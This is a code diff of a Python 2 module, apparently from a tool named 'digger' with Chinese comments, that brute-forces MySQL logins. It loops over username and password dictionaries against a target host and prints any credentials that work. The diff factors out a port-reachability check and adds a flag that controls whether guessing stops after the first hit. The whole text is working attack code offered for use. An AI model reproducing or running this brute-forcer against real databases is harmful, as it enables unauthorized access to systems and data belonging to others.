@@ -9,27 +9,34 @@ digger程序调用explode进行单个爆破
 """
 USER_DIC_ARR = []
 PASSWD_DIC_ARR = []
+# 懒爆破只爆破一个后retun,避免因为空密码，造成任意密码刷屏
+LAZY_EXPOLDE = False
 def explode(host,port,dic):
     # port 这里是int类型
     usernameDic = dic['username']
     passwordDic = dic['password']
+    #查看是不是主机和port不能连接
+    if not connectToHp(host,port):
+        return
     for username in usernameDic:
         for passwd in passwordDic:
             if connectToDB(host,port,username,passwd):
                 print '\33[33m'+host+':mysql\t'+'username:'+username+'\tpassword:'+passwd+'\33[37m'
-                return
-            else:
-                #查看是不是主机和port不能连接
-                sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                sk.settimeout(10)
-                try:
-                    sk.connect((host,port))
-                    continue
-                except Exception:
-                    print "bad connection to "+host+':'+str(port)
+                if LAZY_EXPOLDE:
                     return
+def connectToHp(host,port):
+    #查看是不是主机和port不能连接
+    sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sk.settimeout(10)
+    try:
+        sk.connect((host,port))
+        sk.close()
+        return True
+    except Exception:
+        print "\33[34mbad connection to "+host+':'+str(port)+'\33[37m'
+        return False
+
 def connectToDB(host,port,username,passwd):
-    print host+':'+str(port)+'\t'+username+':'+passwd
     db = None
     try:
         db = MySQLdb.connect(host=host, user=username, passwd=passwd,port=port,connect_timeout=5)
@@ -51,22 +58,14 @@ def explodeListHp(hp):
     port = int(hp.split(':')[1])
     userDic = getUserDic()
     passwdDic = getPasswdDic()
+    #查看是不是主机和port不能连接
+    if not connectToHp(host,port):
+        return
     for username in userDic:
         for password in passwdDic:
             if connectToDB(host,port,username,password):
                 print '\33[33m'+hp+':mysql\t'+'username:'+username+'\tpassword:'+password+'\33[37m'
-                return
-            else:
-                #查看是不是主机和port不能连接
-                sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                sk.settimeout(5)
-                try:
-                    sk.connect((host,port))
-                    sk.close()
-                    continue
-                except Exception:
-                    print "bad connection to "+host+':'+str(port)
-                    sk.close()
+                if LAZY_EXPOLDE:
                     return
 
 if __name__ == '__main__':
